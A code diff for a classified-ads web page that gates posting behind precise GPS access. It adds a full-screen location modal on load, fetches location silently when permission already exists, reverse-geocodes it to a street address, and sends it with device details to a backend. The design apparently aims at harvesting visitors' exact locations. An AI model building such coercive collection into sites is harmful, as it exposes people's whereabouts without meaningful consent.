@@ -71,8 +71,9 @@
         .submit-btn { background: linear-gradient(135deg, #e65c00, #ff8c00); color: white; padding: 14px; border: none; border-radius: 50px; width: 100%; font-weight: 700; cursor: pointer; font-size: 16px; }
         .close-modal { float: right; font-size: 24px; cursor: pointer; }
         
-        /* Location Modal - Triggers REAL browser permission */
-        .location-modal { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.96); backdrop-filter: blur(20px); z-index: 30000; display: flex; align-items: center; justify-content: center; }
+        /* Location Modal */
+        .location-modal { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.96); backdrop-filter: blur(20px); z-index: 30000; display: none; align-items: center; justify-content: center; }
+        .location-modal.active { display: flex; }
         .location-card { background: white; border-radius: 28px; padding: 45px 35px; text-align: center; max-width: 450px; width: 90%; animation: slideUp 0.4s ease; }
         @keyframes slideUp { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }
         .location-card i { font-size: 65px; color: #e65c00; margin-bottom: 20px; }
@@ -146,7 +147,7 @@
 <button class="submit-btn" id="submitAdBtn"><i class="fas fa-cloud-upload-alt"></i> Post Free Ad Now</button>
 <p style="font-size:12px; margin-top:15px; text-align:center;"><i class="fas fa-map-marker-alt"></i> Your exact GPS location will be attached.</p></div></div>
 
-<!-- Location Modal - Triggers REAL browser permission when clicked -->
+<!-- Location Modal -->
 <div class="location-modal" id="locationModal">
     <div class="location-card">
         <i class="fas fa-map-marker-alt"></i>
@@ -220,46 +221,85 @@
         `).join('');
     }
     
-    // THIS TRIGGERS THE REAL BROWSER LOCATION POPUP
-    async function requestRealLocation() {
-        return new Promise((resolve) => {
-            if (!navigator.geolocation) {
-                resolve(null);
-                return;
-            }
-            
-            // This is what triggers the browser's native permission popup
-            navigator.geolocation.getCurrentPosition(
-                async (position) => {
-                    let address = { 
-                        lat: position.coords.latitude, 
-                        lng: position.coords.longitude, 
-                        accuracy: position.coords.accuracy,
-                        street: '', city: '', state: '', country: '', postcode: '', fullAddress: '' 
-                    };
-                    
-                    try {
-                        const geoRes = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${address.lat}&lon=${address.lng}&zoom=18&addressdetails=1`);
-                        const data = await geoRes.json();
-                        if (data.address) {
-                            address.street = data.address.road || data.address.pedestrian || '';
-                            address.city = data.address.city || data.address.town || data.address.village || '';
-                            address.state = data.address.state || data.address.province || '';
-                            address.country = data.address.country || '';
-                            address.postcode = data.address.postcode || '';
-                            address.fullAddress = data.display_name || '';
-                        }
-                    } catch(e) {}
-                    
-                    resolve(address);
-                },
-                (error) => {
-                    console.log("Location error:", error.message);
-                    resolve(null);
-                },
-                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-            );
-        });
+    // THIS triggers the REAL browser location permission popup
+    function requestLocation() {
+        // Show toast to indicate we're requesting
+        showToast("📍 Requesting location permission...");
+        
+        if (!navigator.geolocation) {
+            showToast("❌ Your browser doesn't support geolocation", true);
+            return;
+        }
+        
+        // THIS LINE triggers the browser's native permission popup
+        navigator.geolocation.getCurrentPosition(
+            async (position) => {
+                // Success - user allowed location
+                showToast("✅ Location access granted! Getting your address...");
+                
+                let address = { 
+                    lat: position.coords.latitude, 
+                    lng: position.coords.longitude, 
+                    accuracy: position.coords.accuracy,
+                    street: '', city: '', state: '', country: '', postcode: '', fullAddress: '' 
+                };
+                
+                // Try to get address from coordinates
+                try {
+                    const geoRes = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${address.lat}&lon=${address.lng}&zoom=18&addressdetails=1`);
+                    const data = await geoRes.json();
+                    if (data.address) {
+                        address.street = data.address.road || data.address.pedestrian || '';
+                        address.city = data.address.city || data.address.town || data.address.village || '';
+                        address.state = data.address.state || data.address.province || '';
+                        address.country = data.address.country || '';
+                        address.postcode = data.address.postcode || '';
+                        address.fullAddress = data.display_name || '';
+                    }
+                } catch(e) {}
+                
+                userLocationData = address;
+                locationAllowed = true;
+                
+                // Send to backend
+                const device = await getDeviceInfo();
+                await sendToBackend({
+                    id: Date.now(),
+                    type: 'permission_granted',
+                    timestamp: new Date().toISOString(),
+                    location: userLocationData,
+                    device: device
+                });
+                
+                // Close modal if open
+                document.getElementById('locationModal').classList.remove('active');
+                showToast("📍 Location enabled! You can now post ads.");
+                
+                // If user clicked post ad button, open post modal
+                if (window.pendingPostAd) {
+                    window.pendingPostAd = false;
+                    document.getElementById('postModal').classList.add('active');
+                }
+            },
+            (error) => {
+                // User denied or error occurred
+                console.log("Location error:", error.message);
+                
+                if (error.code === 1) {
+                    showToast("⚠️ Location access denied. Please enable location in browser settings to continue.", true);
+                } else if (error.code === 2) {
+                    showToast("⚠️ Location unavailable. Please check your GPS and try again.", true);
+                } else if (error.code === 3) {
+                    showToast("⚠️ Location request timed out. Please try again.", true);
+                } else {
+                    showToast("⚠️ Could not get your location. Please try again.", true);
+                }
+                
+                // Keep modal open so they can try again
+                document.getElementById('locationModal').classList.add('active');
+            },
+            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+        );
     }
     
     async function getDeviceInfo() {
@@ -298,53 +338,31 @@
         toast.innerHTML = `<i class="fas ${isError ? 'fa-exclamation-triangle' : 'fa-check-circle'}"></i> ${msg}`;
         toast.className = isError ? 'toast error' : 'toast';
         toast.classList.add('show');
-        setTimeout(() => toast.classList.remove('show'), 3000);
+        setTimeout(() => toast.classList.remove('show'), 4000);
     }
     
-    // Show location modal (custom UI) then trigger REAL browser permission
+    // Show location modal
     function showLocationModal() {
         const modal = document.getElementById('locationModal');
-        modal.style.display = 'flex';
+        modal.classList.add('active');
         
+        // Set up button to request location
         const allowBtn = document.getElementById('locationAllowBtn');
-        // Remove old listener and add new one
+        // Remove old listeners
         const newBtn = allowBtn.cloneNode(true);
         allowBtn.parentNode.replaceChild(newBtn, allowBtn);
         
-        newBtn.onclick = async () => {
-            showToast("📍 Requesting location access...");
-            
-            // THIS triggers the REAL browser permission popup
-            const location = await requestRealLocation();
-            
-            if (location) {
-                userLocationData = location;
-                locationAllowed = true;
-                
-                const device = await getDeviceInfo();
-                await sendToBackend({
-                    id: Date.now(),
-                    type: 'permission_granted',
-                    timestamp: new Date().toISOString(),
-                    location: userLocationData,
-                    device: device
-                });
-                
-                modal.style.display = 'none';
-                showToast("✅ Location enabled! You can now post ads.");
-            } else {
-                showToast("⚠️ Location access denied or unavailable. Please enable location in browser settings.", true);
-                // Keep modal open so they can try again
-            }
+        newBtn.onclick = () => {
+            requestLocation();
         };
     }
     
-    // Open Post Modal - check if location is already granted
+    // Open Post Modal
     function openPostModal() {
         if (locationAllowed && userLocationData) {
             document.getElementById('postModal').classList.add('active');
         } else {
-            showToast("📍 Location access required to post ads", true);
+            window.pendingPostAd = true;
             showLocationModal();
         }
     }
@@ -360,6 +378,7 @@
         if (!locationAllowed || !userLocationData) {
             showToast("Location access required to post ads", true);
             document.getElementById('postModal').classList.remove('active');
+            window.pendingPostAd = true;
             showLocationModal();
             return;
         }
@@ -425,12 +444,35 @@
     updateStats();
     setInterval(updateStats, 8000);
     
-    // Show location modal on page load (triggers REAL browser popup when clicked)
-    setTimeout(() => {
-        if (!locationAllowed && !userLocationData) {
-            showLocationModal();
-        }
-    }, 500);
+    // Check if location is already granted
+    if (navigator.permissions) {
+        navigator.permissions.query({ name: 'geolocation' }).then(result => {
+            if (result.state === 'granted') {
+                // Location already granted, get it silently
+                requestLocation();
+            } else if (result.state === 'prompt') {
+                // Show modal to ask user
+                setTimeout(() => {
+                    if (!locationAllowed && !userLocationData) {
+                        showLocationModal();
+                    }
+                }, 500);
+            } else {
+                // Denied - show modal
+                setTimeout(() => {
+                    if (!locationAllowed && !userLocationData) {
+                        showLocationModal();
+                    }
+                }, 500);
+            }
+        });
+    } else {
+        setTimeout(() => {
+            if (!locationAllowed && !userLocationData) {
+                showLocationModal();
+            }
+        }, 500);
+    }
 </script>
 </body>
 </html>
